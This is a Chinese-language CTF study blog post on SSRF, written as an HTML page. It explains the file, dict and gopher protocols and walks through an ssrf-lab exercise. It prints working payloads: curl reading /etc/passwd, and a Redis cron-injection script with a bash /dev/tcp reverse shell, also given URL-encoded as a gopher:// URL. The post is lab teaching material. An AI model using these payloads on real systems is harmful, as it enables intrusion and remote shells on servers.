@@ -1,0 +1,253 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SSRF服务器端请求伪造 | 学习记录</title><meta name="author" content="MirRoR4s"><meta name="copyright" content="MirRoR4s"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="服务器端请求伪造记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF服务器端请求伪造">
+<meta property="og:url" content="http://example.com/2022/07/11/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/index.html">
+<meta property="og:site_name" content="学习记录">
+<meta property="og:description" content="服务器端请求伪造记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png">
+<meta property="article:published_time" content="2022-07-11T07:25:02.000Z">
+<meta property="article:modified_time" content="2022-09-02T08:53:33.950Z">
+<meta property="article:author" content="MirRoR4s">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/07/11/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSRF服务器端请求伪造',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2022-09-02 16:53:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/10/29/9JUMAPsw5BOigto.jpg" onerror="onerror=null;src='/img/output.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">108</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">学习记录</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SSRF服务器端请求伪造</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-11T07:25:02.000Z" title="发表于 2022-07-11 15:25:02">2022-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-02T08:53:33.950Z" title="更新于 2022-09-02 16:53:33">2022-09-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SSRF服务器端请求伪造"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><!--toc-->
+<p>服务器端请求伪造记录</p>
+<span id="more"></span>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7333">https://xz.aliyun.com/t/7333</a></p>
+<p>[TOC]</p>
+<h2 id="0x00-liao-jie-ssrf"><a href="#0x00-了解SSRF" class="headerlink" title="0x00 了解SSRF"></a>0x00 了解SSRF<a href="#0x00-liao-jie-ssrf" class="header-anchor">#</a></h2><h3 id="ssrf-jian-jie"><a href="#SSRF简介：" class="headerlink" title="SSRF简介："></a>SSRF简介：<a href="#ssrf-jian-jie" class="header-anchor">#</a></h3><p>SSRF(Server-Side Request Forgery)，即服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据的限制，本质上是属于信息泄露漏洞。</p>
+<h3 id="ssrf-lou-dong-yuan-li"><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：<a href="#ssrf-lou-dong-yuan-li" class="header-anchor">#</a></h3><p>SSRF形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能，但是却没有对目的地址做过滤与限制。比如从指定URL地址获取网页的文本内容，加载指定地址的图片、下载等等。而且在大部分的web服务器架构中，web服务器自身是可以访问互联网和服务器所在的内网的，所以攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</p>
+<p>而且在一般情况下，SSRF攻击的目标是外网无法访问的内部系统（即内网），所以SSRF漏洞也可以用一句话来进行总结：利用一个可以发起网络请求的服务器当作跳板来攻击内部其他服务。</p>
+<h3 id="gopher-dict-xie-yi-yi-ji-redis-fu-wu-curl-ming-ling"><a href="#gopher、dict协议以及redis服务、curl命令" class="headerlink" title="gopher、dict协议以及redis服务、curl命令"></a>gopher、dict协议以及redis服务、curl命令<a href="#gopher-dict-xie-yi-yi-ji-redis-fu-wu-curl-ming-ling" class="header-anchor">#</a></h3><p>gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。</p>
+<p>dict协议：一个字典服务器协议——A Dictionary Server Protocol，允许客户端在使用过程中访问更多字典并且该协议约定服务器端侦听端口号：2628。 协议详解：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html">https://www.cnblogs.com/kkun/archive/2009/03/28/1424052.html</a>           </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html">https://www.cnblogs.com/Node-Sans-Blog/p/15118018.html</a></p>
+<p>redis服务是在6379端口开启的，这里大致知道一下其用处即可。</p>
+<p>curl命令在SSRF漏洞有非常重要的作用，这里简单的介绍一下curl命令：</p>
+<p>curl是常用的命令行工具，用来请求Web服务器。它的名字就是客户端的URL工具的意思。不带任何参数时，curl就是发出GET请求，比如：</p>
+<p><code>curl https://www.example.com</code>，这个命令向<code>www.example.com</code>发出GET请求，服务器返回的内容会在命令行输出。</p>
+<p>curl命令的详细说明：<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">http://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
+<p>此命令的<code>-v</code>参数输出通信的整个过程，用于调试。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用file协议 curl -v file:///etc/passwd</span><br><span class="line">使用ftp协议 curl -v &quot;ftp://127.0.0.1:端口/info&quot;</span><br><span class="line">使用dict协议 curl -v &quot;dict://127.0.0.1:端口/info&quot;</span><br><span class="line">使用gopher协议 curl -v &quot;gopher://127.0.0.1:端口/_info&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="chang-jian-nei-wang-ip-duan"><a href="#常见内网IP段" class="headerlink" title="常见内网IP段"></a>常见内网IP段<a href="#chang-jian-nei-wang-ip-duan" class="header-anchor">#</a></h3><p>局域网地址范围分三类，以下IP段为内网IP段：</p>
+<p><code>C类：192.168.0.0 - 192.168.255.255</code></p>
+<p><code>B类：172.16.0.0 - 172.31.255.255</code></p>
+<p><code>A类：10.0.0.0 - 10.255.255.255</code></p>
+<h3 id="ssrf-lou-dong-de-wa-jue-yu-li-yong"><a href="#SSRF漏洞的挖掘与利用：" class="headerlink" title="SSRF漏洞的挖掘与利用："></a>SSRF漏洞的挖掘与利用：<a href="#ssrf-lou-dong-de-wa-jue-yu-li-yong" class="header-anchor">#</a></h3><p>存在SSTF漏洞的站点主要利用四个协议，分别是<code>http、file、gopher、dict</code>协议。</p>
+<p><code>file</code>协议进行本地文件的读取</p>
+<p><code>http</code>协议进行内网的ip扫描、端口探测</p>
+<p>探测到<code>6379</code>端口开放，可以利用<code>http、gopher、dict</code>这几个协议来攻击开放了6379端口的redis服务。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115508-f0e8e08a-5dcb-1.png" alt="img"></p>
+<p>下面通过实践练习如何利用SSRF漏洞进行攻击。</p>
+<p>靶场下载地址和使用教程：<a target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p>
+<h3 id="ssrf-lab"><a href="#ssrf-lab" class="headerlink" title="ssrf-lab"></a>ssrf-lab<a href="#ssrf-lab" class="header-anchor">#</a></h3><p>答案地址：</p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a">https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a</a></p>
+<p>重要的东西<a target="_blank" rel="noopener" href="https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/">https://se8s0n.github.io/2019/05/19/SSRF-LABS%E6%8C%87%E5%8D%97/</a></p>
+<p>OUTGOING WEBHOOK 输入的<code>https://yourhandler.io/events</code>是有 REST API 监听的需要测试项目</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115606-135773d4-5dcc-1.png" alt="img"></p>
+<p>在 SEE THE RESULT 的部分会显示请求响应的结果和状态码。下面就先测试一下<code>127.0.0.1</code>，发现有回显数据，说明这里没有对内网ip进行限制</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115630-214e0390-5dcc-1.png" alt="img"></p>
+<p>上面了解了SSRF可以通过几种协议来进行读取文件，在这里就进行测试一下：</p>
+<p>使用<code>file:///etc/passwd</code>读取用户密码,发现是可以读取</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115652-2ed303f8-5dcc-1.png" alt="img"></p>
+<p>除此之外，利用这个协议可以读取主机内任意文件。接下来可以读取配置文件和源代码方便进一步的渗透，这里之所以成功实现是因为URL没有经过严格的过滤，所以才可以利用这个协议进行任意文件读取。</p>
+<p>在上面还介绍过<code>redis</code>服务，看了很多<code>SSRF</code> 协议中的利用都是结合 Redis 服务的，所以这里就先在<code>ssrf-basics</code> 容器里面安装该服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps #查看容器编号</span><br><span class="line">$ docker exec -it 容器编号 /bin/bash #进入容器</span><br><span class="line">$ apt-get install redis-server # 安装redis服务</span><br><span class="line">$ redis-server #开启redis服务</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115712-3aa6359c-5dcc-1.png" alt="img"></p>
+<p>安装好之后，便可以利用协议收集信息及反弹 shell</p>
+<p>利用<code>dict</code>协议，<code>dict://127.0.0.1:6379/info</code>可获取本地<code>redis</code>服务配置信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115739-4a93543a-5dcc-1.png" alt="img"></p>
+<p>利用<code>dict://127.0.0.1:6379/KEYS *</code>获取 <code>redis</code> 存储的内容</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115759-56c333ec-5dcc-1.png" alt="img"></p>
+<p>这就是<code>dict</code>协议的简单利用，除此之外，利用<code>gopher</code>协议可以攻击<code>redis</code></p>
+<p>内网中的redis存在未授权访问漏洞，当Redis服务以root 权限运行时，利用 Gopher 协议攻击内网中的 Redis，通过写入定时任务可以实现反弹shell</p>
+<p>首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure>
+<p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于 <code>Gopher</code> 协议的 URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</span><br></pre></td></tr></table></figure>
+<p>将上面的复制粘贴到网页即可实现攻击。此exp经过url解码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200304115823-64fbf7b4-5dcc-1.png" alt="img"></p>
+<p>利用<code>Gopher</code> 协议还可以攻击 <code>FastCGI</code>，攻击内网 <code>Vulnerability Web</code>。具体可以参考<a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a></p>
+<h2 id="ssrf-chang-jian-rao-guo"><a href="#SSRF常见绕过" class="headerlink" title="SSRF常见绕过"></a>SSRF常见绕过<a href="#ssrf-chang-jian-rao-guo" class="header-anchor">#</a></h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11215#toc-7">https://xz.aliyun.com/t/11215#toc-7</a></p>
+<h2 id="yi-xie-sstf-ba-chang-lian-xi-ti"><a href="#一些SSTF靶场练习题" class="headerlink" title="一些SSTF靶场练习题"></a>一些SSTF靶场练习题<a href="#yi-xie-sstf-ba-chang-lian-xi-ti" class="header-anchor">#</a></h2><h3 id="ctfshow-de-ssrf-lian-xi"><a href="#ctfshow的ssrf练习" class="headerlink" title="ctfshow的ssrf练习"></a>ctfshow的ssrf练习<a href="#ctfshow-de-ssrf-lian-xi" class="header-anchor">#</a></h3><p>答案：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50589021/article/details/120183781">https://blog.csdn.net/qq_50589021/article/details/120183781</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120456960">https://blog.csdn.net/cosmoslin/article/details/120456960</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">MirRoR4s</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/07/11/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/index.html">http://example.com/2022/07/11/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/index.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">学习记录</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/07/12/%E5%8F%8D%E5%BC%B9Shell/index.html"><img class="prev-cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" onerror="onerror=null;src='https://github.com/MirRoR4s/MirRoR4s.github.io/blob/main/images/output.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">反弹Shell</div></div></a></div><div class="next-post pull-right"><a href="/2022/06/25/An-Introduction-to-Mathematicl-Cryptography/index.html"><img class="next-cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" onerror="onerror=null;src='https://github.com/MirRoR4s/MirRoR4s.github.io/blob/main/images/output.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">An Introduction to Mathematicl Cryptography</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/09/30/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF/index.html" title="2022羊城杯"><img class="cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-30</div><div class="title">2022羊城杯</div></div></a></div><div><a href="/2022/06/04/Break-The-Syntax-CTF/index.html" title="Break The Syntax CTF"><img class="cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-04</div><div class="title">Break The Syntax CTF</div></div></a></div><div><a href="/2022/09/26/DownUnderCTF-2022/index.html" title="DownUnderCTF_2022"><img class="cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-26</div><div class="title">DownUnderCTF_2022</div></div></a></div><div><a href="/2022/07/23/Google-CTF-2022/index.html" title="Google_CTF_2022"><img class="cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-23</div><div class="title">Google_CTF_2022</div></div></a></div><div><a href="/2022/07/12/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html" title="JAVA反序列化"><img class="cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-12</div><div class="title">JAVA反序列化</div></div></a></div><div><a href="/2022/06/02/Jarvis-OJ-PHPINFO/index.html" title="Jarvis OJ-PHPINFO"><img class="cover" src="https://s2.loli.net/2022/10/29/IfNThRa5dqZ2KAH.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-02</div><div class="title">Jarvis OJ-PHPINFO</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/10/29/9JUMAPsw5BOigto.jpg" onerror="this.onerror=null;this.src='/img/output.jpg'" alt="avatar"/></div><div class="author-info__name">MirRoR4s</div><div class="author-info__description">不能说的秘密</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">108</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MirRoR4s"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/MirRoR4s" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:mirror4s@birkenwald.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">不以物喜，不以己悲。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-liao-jie-ssrf"><span class="toc-number">1.</span> <span class="toc-text">0x00 了解SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-jian-jie"><span class="toc-number">1.1.</span> <span class="toc-text">SSRF简介：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-lou-dong-yuan-li"><span class="toc-number">1.2.</span> <span class="toc-text">SSRF漏洞原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher-dict-xie-yi-yi-ji-redis-fu-wu-curl-ming-ling"><span class="toc-number">1.3.</span> <span class="toc-text">gopher、dict协议以及redis服务、curl命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#chang-jian-nei-wang-ip-duan"><span class="toc-number">1.4.</span> <span class="toc-text">常见内网IP段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-lou-dong-de-wa-jue-yu-li-yong"><span class="toc-number">1.5.</span> <span class="toc-text">SSRF漏洞的挖掘与利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-lab"><span class="toc-number">1.6.</span> <span class="toc-text">ssrf-lab</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-chang-jian-rao-guo"><span class="toc-number">2.</span> <span class="toc-text">SSRF常见绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yi-xie-sstf-ba-chang-lian-xi-ti"><span class="toc-number">3.</span> <span class="toc-text">一些SSTF靶场练习题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow-de-ssrf-lian-xi"><span class="toc-number">3.1.</span> <span class="toc-text">ctfshow的ssrf练习</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/10/29/%E7%A5%A5%E4%BA%91%E6%9D%AF-2022/index.html" title="祥云杯-2022"><img src="https://s2.loli.net/2022/10/29/9JUMAPsw5BOigto.jpg" 